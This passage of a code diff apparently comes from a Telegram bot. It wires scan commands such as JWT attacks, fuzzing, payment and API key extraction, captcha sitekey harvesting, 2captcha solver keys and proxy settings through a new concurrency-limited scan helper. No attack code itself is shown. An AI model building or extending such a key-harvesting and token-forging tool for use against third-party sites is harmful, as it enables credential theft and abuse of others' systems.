         "high_entropy": result["high_entropy"],
         "source_maps":  result["source_maps"],
+        "sitekeys":     result.get("sitekeys", []),
         "dynamic":      result["dynamic"],
         "errors":       result["errors"],
     }
@@ -20983,7 +26046,8 @@ async def cmd_kdexport(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption=(
                 f"💾 *KeyDump Export*\n"
                 f"🌐 `{result['url'][:60]}`\n"
-                f"📊 `{sum(len(v) for v in export['findings'].values())}` total findings"
+                f"📊 `{sum(len(v) for v in export['findings'].values())}` total findings\n"
+                f"🔑 Sitekeys: `{len(export['sitekeys'])}`"
             ),
             parse_mode="Markdown"
         )
@@ -21369,7 +26433,7 @@ async def cmd_webhooks(update: Update, context: ContextTypes.DEFAULT_TYPE):
     prog = asyncio.create_task(_prog())
 
     try:
-        result = await asyncio.to_thread(_webhooks_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _webhooks_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
@@ -21593,7 +26657,7 @@ async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_vuln_scan_sync, url, progress_q)
+        result = await run_scan(uid, _vuln_scan_sync, url, progress_q)
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ Scan error: `{escape_md(e)}`", parse_mode='Markdown')
@@ -21645,7 +26709,7 @@ async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_endpoints_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _endpoints_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
@@ -21728,7 +26792,7 @@ async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        found, baseline = await asyncio.to_thread(_fuzz_sync, url, mode, progress_q)
+        found, baseline = await run_scan(uid, _fuzz_sync, url, mode, progress_q)
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
@@ -21802,7 +26866,7 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 words = ["api", "admin", "login", "user", "config", "static", "assets"]
             progress_q.append(f"🧠 Wordlist built: `{len(words)}` words — probing...")
             return _smartfuzz_probe_sync(url, words, lambda t: progress_q.append(t))
-        found = await asyncio.to_thread(_run)
+        found = await run_scan(uid, _run)
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
@@ -21862,7 +26926,7 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         exp_atk   = _jwt_exp_forgery(token)
         return decoded, none_atk, alg_atk, brute_atk, kid_atk, exp_atk
     try:
-        decoded, none_atk, alg_atk, brute_atk, kid_atk, exp_atk = await asyncio.to_thread(_run)
+        decoded, none_atk, alg_atk, brute_atk, kid_atk, exp_atk = await run_scan(uid, _run)
     except Exception as e:
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
         return
@@ -21928,7 +26992,7 @@ async def cmd_hiddenkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_hiddenkeys_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _hiddenkeys_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
@@ -22043,7 +27107,7 @@ async def cmd_endpoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_endpoints_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _endpoints_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
@@ -22113,7 +27177,7 @@ async def cmd_oauthscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_oauthscan_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _oauthscan_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
@@ -22404,8 +27468,9 @@ def main():
     )
 
     # ── Init asyncio primitives (event loop must be running) ─
-    global download_semaphore, db_lock, _dl_queue
+    global download_semaphore, db_lock, _dl_queue, _scan_semaphore
     download_semaphore = asyncio.Semaphore(MAX_WORKERS)
+    _scan_semaphore    = asyncio.Semaphore(MAX_WORKERS)   # 5 concurrent scans
     db_lock            = asyncio.Lock()
     _dl_queue          = asyncio.Queue(maxsize=QUEUE_MAX)
 
@@ -22437,14 +27502,15 @@ def main():
     app.add_handler(CommandHandler("keydump",        cmd_keydump))
     app.add_handler(CommandHandler("kdexport",       cmd_kdexport))
     app.add_handler(CommandHandler("sitekey",        cmd_sitekey))
+    app.add_handler(CommandHandler("setapikey",      cmd_setapikey))
     # ── Key Extractor commands ────────────────────────
     app.add_handler(CommandHandler("apikeys",         cmd_apikeys))
     app.add_handler(CommandHandler("firebase",        cmd_firebase))
     app.add_handler(CommandHandler("firecheck",       cmd_firecheck))
     app.add_handler(CommandHandler("entropy",         cmd_entropy))
     app.add_handler(CommandHandler("deobfuscate",     cmd_deobfuscate))
-    app.add_handler(CommandHandler("paykeys",         cmd_paykeys))
     app.add_handler(CommandHandler("payconfig",       cmd_payconfig))
+    app.add_handler(CommandHandler("paykeys",         cmd_paykeys))
     app.add_handler(CommandHandler("verifykeys",      cmd_verifykeys))
     app.add_handler(CommandHandler("socialkeys",      cmd_socialkeys))
     app.add_handler(CommandHandler("analytics",       cmd_analytics))
@@ -22475,12 +27541,13 @@ def main():
         filters.Document.ALL, handle_app_upload
     ))
     # ── Callbacks ─────────────────────────────────────
-    app.add_handler(CallbackQueryHandler(keydump_callback,      pattern="^kd_"))
-    app.add_handler(CallbackQueryHandler(verifykeys_callback,   pattern="^vk_"))
-    app.add_handler(CallbackQueryHandler(force_join_callback,   pattern="^fj_check$"))
-    app.add_handler(CallbackQueryHandler(appassets_cat_callback, pattern="^apa_"))
-    app.add_handler(CallbackQueryHandler(admin_callback,        pattern="^adm_"))
-    app.add_handler(CallbackQueryHandler(help_category_callback, pattern="^help_"))
+    app.add_handler(CallbackQueryHandler(keydump_callback,        pattern="^kd_"))
+    app.add_handler(CallbackQueryHandler(verifykeys_callback,     pattern="^vk_"))
+    app.add_handler(CallbackQueryHandler(sitekey_verify_callback, pattern="^sv_"))
+    app.add_handler(CallbackQueryHandler(force_join_callback,     pattern="^fj_check$"))
+    app.add_handler(CallbackQueryHandler(appassets_cat_callback,  pattern="^apa_"))
+    app.add_handler(CallbackQueryHandler(admin_callback,          pattern="^adm_"))
+    app.add_handler(CallbackQueryHandler(help_category_callback,  pattern="^help_"))
     # ── Global error handler → Admin notify ──────────
     app.add_error_handler(error_handler)
 
@@ -22528,12 +27595,13 @@ def main():
                     BotCommand("jsdownload",  "JS/React/Vue site download"),
                     BotCommand("jsfullsite",  "JS + Full crawl"),
                     BotCommand("resume",      "Download ဆက်လုပ်ရန်"),
-                    BotCommand("stop",        "Download ရပ်ရန်"),
+                    BotCommand("stop",        "လက်ရှိ operation အကုန် ရပ်ရန်"),
                     BotCommand("vuln",        "Security vulnerability scan"),
                     BotCommand("api",         "API endpoint discovery"),
                     BotCommand("tech",        "Tech stack fingerprint"),
                     BotCommand("extract",     "Secret & key scanner"),
                     BotCommand("sitekey",     "Captcha key extractor"),
+                    BotCommand("setapikey",   "Set 2captcha / CapSolver API key"),
                     BotCommand("antibot",     "Anti-bot bypass tester"),
                     BotCommand("jwtattack",   "JWT decode & attack"),
                     BotCommand("keydump",     "All-in-one key dump"),
@@ -22542,8 +27610,8 @@ def main():
                     BotCommand("firecheck",   "Firebase misconfig scanner"),
                     BotCommand("entropy",     "High entropy secret hunter"),
                     BotCommand("deobfuscate", "JS secret de-obfuscator"),
+                    BotCommand("payconfig",   "Payment config auditor"),
                     BotCommand("paykeys",     "Payment key extractor"),
-                    BotCommand("payconfig",   "Payment SDK public config extractor"),
                     BotCommand("verifykeys",  "Payment key validator (read-only)"),
                     BotCommand("socialkeys",  "OAuth / social key extractor"),
                     BotCommand("analytics",   "Analytics ID extractor"),
@@ -22558,6 +27626,10 @@ def main():
                     BotCommand("smartfuzz",   "Context-aware smart fuzzer"),
                     BotCommand("monitor",     "Page change alert monitor"),
                     BotCommand("appassets",   "Web app asset analyzer"),
+                    BotCommand("kdexport",    "Keydump JSON export"),
+                    BotCommand("jwtlive",     "JWT live network interceptor"),
+                    BotCommand("chatkeys",    "Chat/messaging key extractor"),
+                    BotCommand("stop",        "လက်ရှိ operation ရပ်ရန်"),
                     BotCommand("status",      "Daily usage & limit"),
                     BotCommand("history",     "Download history"),
                     BotCommand("mystats",     "Detailed statistics"),
@@ -22573,6 +27645,7 @@ def main():
                     BotCommand("setpages",    "Set max pages"),
                     BotCommand("setassets",   "Set max assets"),
                     BotCommand("proxy",       "Proxy pool status"),
+                    BotCommand("setproxy",    "Set proxy (url/file/off)"),
                     BotCommand("setforcejoin","Set force join channel"),
                 ]
                 try:
